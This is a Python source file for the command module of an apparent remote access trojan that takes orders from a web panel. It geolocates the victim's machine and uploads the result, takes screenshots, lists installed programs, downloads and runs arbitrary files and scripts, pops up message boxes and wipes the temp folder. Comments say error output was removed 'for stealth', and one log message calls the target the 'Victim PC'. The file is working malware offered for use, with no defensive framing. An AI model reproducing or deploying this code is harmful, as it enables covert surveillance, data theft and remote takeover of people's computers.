import os, tempfile, shutil, requests, base64
from mss import mss  # Used In Taking Screenshot
from HTTPSocket import HTTPSocket

class ClientsCMD:
    def __init__(self, panelURL, machineID):
        self.panelURL = panelURL
        self.machineID = machineID
        self.C = HTTPSocket(self.panelURL, self.machineID)   # Initiate HTTPSocket Class
        self.tempdir = tempfile.gettempdir()

    def get_device_location(self):
        """
        Function to return GeoIP Latitude & Longitude
        """
        try:
            ip_response = requests.get("https://api.ipify.org", timeout=15)
            ip = ip_response.text.strip()
            geo_request = requests.get("https://get.geojs.io/v1/ip/geo/" + ip + ".json", timeout=15)
            geo_data = geo_request.json()
            
            path = os.path.join(self.tempdir, "Location.txt")
            
            with open(path, "w") as f:
                f.write(f"Accuracy          : {geo_data['accuracy']}         \n")                    
                f.write(f"Public IPv4       : {geo_data['ip']}               \n")                                       
                f.write(f"Latitude          : {geo_data['latitude']}         \n")                    
                f.write(f"Longitude         : {geo_data['longitude']}        \n")                    
                f.write(f"City              : {geo_data['city']}             \n")                    
                f.write(f"Region            : {geo_data['region']}           \n")                    
                f.write(f"Country           : {geo_data['country']}          \n")                    
                f.write(f"Country Code      : {geo_data['country_code']}     \n")                    
                f.write(f"Country Code 3    : {geo_data['country_code3']}    \n")                    
                f.write(f"Continent Code    : {geo_data['continent_code']}   \n")                    
                f.write(f"Timezone          : {geo_data['timezone']}         \n")                    
                f.write(f"Organization      : {geo_data['organization']}     \n")                    
                f.write(f"Organization Name : {geo_data['organization_name']}\n")                    

            publicIP = geo_data['ip']
            latitude = geo_data['latitude']
            longitude = geo_data['longitude']
            
            self.C.Send(f"UpdateLocation|BN|{publicIP}|BN|{latitude}|BN|{longitude}")
            self.C.Upload(path)
            os.remove(path)
            self.C.Log("Succ", "Geo Latitude and Longitude Retrived Successfully")  
            self.C.Send("CleanCommands") 
        except Exception as e:
            self.C.Send("CleanCommands")
            # print("[Error In ClientsCMD, get_device_location() Function]") # Removed for stealth
            # print(f"[Error] : {e}\n") # Removed for stealth
            self.C.Log("Fail", "An unexpected error occurred " + str(e))              

    def upload_and_execute_file(self, file_url, file_new_name):
        try:
            #Downloading File in Temp
            if file_new_name == "":
                file_new_name = file_url.split("/")[-1]
                
            destination_path = os.path.join(self.tempdir, file_new_name)
            self.C.Download(file_url, destination_path)

            #Executing File 
            os.system(destination_path)

            self.C.Log("Succ", "File is Uploaded and Executed File Successfully")  
            self.C.Send("CleanCommands") 
        except Exception as e:
            self.C.Send("CleanCommands")
            # print("[Error In ClientsCMD, upload_and_execute_file() Function]") # Removed for stealth
            # print(f"[Error] : {e}\n") # Removed for stealth
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))        

    def show_message_box(self, msg, title, iconType, buttonType):
        """ 
        ButtonType = OkOnly/OkCancel/AbortRetryIgnore/YesNoCancel/YesNO/RetryCancel
        ===========================================================================
        0 = OKOnly
        1 = OKCancel
        2 = AbortRetryIgnore
        3 = YesNoCancel 
        4 = YesNo
        5 = RetryCancel

        IconType = None/Critical/Question/Warning/Information/Asterisk 
        ==============================================================
        16 = Critical - Critical Message icon
        32 = Question - Warning Query icon
        48 = Warning - Warning Message icon
        64 = Information - Information Message icon
        0  = Blank         
        """  
        try:
            
            buttonNumber = 0 # Default to OkOnly
            if buttonType == "OkOnly":
                buttonNumber = 0
            elif buttonType == "OkCancel":
                buttonNumber = 1
            elif buttonType == "AbortRetryIgnore":
                buttonNumber = 2
            elif buttonType == "YesNoCancel":
                buttonNumber = 3            
            elif buttonType == "YesNO":
                buttonNumber = 4
            elif buttonType == "RetryCancel":
                buttonNumber = 5

            iconNumber = 0 # Default to Blank
            if iconType == "None":
                iconNumber = 0
            elif iconType == "Critical":
                iconNumber = 16
            elif iconType == "Question":
                iconNumber = 32
            elif iconType == "Warning":
                iconNumber = 48
            elif iconType == "Information":
                iconNumber = 64

            vbs_path = os.path.join(self.tempdir, "message.vbs")
            with open(vbs_path, "w") as f:
                f.write("dim message\n")
                f.write(f"message = MsgBox(\"{msg}\", {iconNumber + buttonNumber}, \"{title}\")\n")
                
            os.system(vbs_path) #Executing VBScript    
            os.remove(vbs_path) # Clean up the VBS file

            self.C.Log("Succ", "Message Shown Successfully")  
            self.C.Send("CleanCommands") 
        except Exception as e:
            self.C.Send("CleanCommands")
            # print("[Error In ClientsCMD, show_message_box() Function]") # Removed for stealth
            # print(f"[Error] : {e}\n") # Removed for stealth
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))

    def take_screenshot(self):
        """
        When Called, It Saves the screenshot.png in TEMP
        """
        try:       
            filename = base64.b64encode(self.machineID.encode()).decode('utf-8')
            screenshot_path = os.path.join(self.tempdir, f"{filename}.png")

            with mss() as screenshot:
                screenshot.shot(output=screenshot_path)
            self.C.Upload(screenshot_path)
            os.remove(screenshot_path)
            self.C.Send("CleanCommands")
            self.C.Log("Succ", "Screenshot Recived Successfully")            
        except Exception as e:
            # print("[Error In ClientsCMD, take_screenshot() Function]") # Removed for stealth
            # print(f"[Error] : {e}\n") # Removed for stealth
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))

    def get_program_list(self):
        """
        When Called, It Saves the ProgramList.txt in TEMP
        """
        try:
            list_path = os.path.join(self.tempdir, "ProgramList.txt")
            cmd = f"wmic /output:{list_path} product get name,version"
            os.system(cmd)
            self.C.Upload(list_path)
            os.remove(list_path)
            
            self.C.Log("Succ", "Retrived Installed Program List from Victim PC")
            self.C.Send("CleanCommands")
        except Exception as e:
            # print("[Error In ClientsCMD, get_program_list() Function]") # Removed for stealth
            # print(f"[Error] : {e}\n") # Removed for stealth
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))                    
        
    def execute_script(self, script_type, script_name):
        """
        Takes 3 Params : ScriptType, ScriptCode, ScriptName
        Creates the Script in TEMP Directory, Executes the Script, Atlast Deletes the Scripts  
        """
        try:
            
            # Remove existing extension before adding the correct one
            base_name, _ = os.path.splitext(script_name)
            script_name = f"{base_name}.{script_type.lower()}"
            
            script_path = os.path.join(self.tempdir, script_name)
            
            # Downloading script in TEMP Directory
            #======================================================
            self.C.Download(self.panelURL + "scripts/" + script_name, script_path)
            #=======================================================
            
            os.system(script_path) # Executing Script
            os.remove(script_path) # Removing Script from TEMP
            
            self.C.Send("DeleteScript|BN|" + script_name)
            self.C.Log("Succ", "Executed Script Successfully")
            self.C.Send("CleanCommands")        
        except Exception as e:
            # print("[Error In ClientsCMD, execute_script() Function]") # Removed for stealth
            # print(f"[Error] : {e}\n") # Removed for stealth
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))
             
    def clear_temp_directory(self):
        """
        When Called, It Cleans the TEMP Directory
        """    
        try:
            for file_name in os.listdir(self.tempdir): # Iterate over full path now
                full_path = os.path.join(self.tempdir, file_name)
                if file_name != "FXSAPIDebugLogFile.txt" and file_name[:4] != "_MEI":
                    try:
                        if os.path.isdir(full_path):
                            shutil.rmtree(full_path)
                        else:
                            os.remove(full_path)
                    except Exception: # Catch any error during deletion
                        pass # Attempt best effort cleanup
            self.C.Log("Succ", "TEMP Directory Cleaned Successfully")
            self.C.Send("CleanCommands")         
        except Exception as e:
            # print("[Error In ClientsCMD, clear_temp_directory() Function]") # Removed for stealth
            # print(f"[Error] : {e}\n") # Removed for stealth
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))            
                    
    def close_connection(self):
        """
        Sends Offline Command to SERVER 
        """
        try:
            self.C.Send("Offline")
            self.C.Log("Succ", "Connection closed")
            self.C.Send("CleanCommands")            
        except Exception as e:
            # print("[Error In ClientsCMD, close_connection()]") # Removed for stealth
            # print(f"[Error] : {e}\n") # Removed for stealth        
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))